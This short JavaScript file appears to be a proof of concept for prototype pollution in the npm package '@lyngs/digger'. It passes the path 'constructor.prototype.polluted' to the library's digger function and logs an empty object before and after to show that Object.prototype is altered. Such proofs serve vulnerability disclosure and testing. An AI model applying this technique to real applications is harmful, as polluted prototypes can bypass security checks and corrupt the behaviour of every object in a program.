var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const {digger} = require('@lyngs/digger');
console.log({}.polluted);
digger(obj, 'constructor.prototype.polluted', 'yes', { extend: true });
console.log({}.polluted);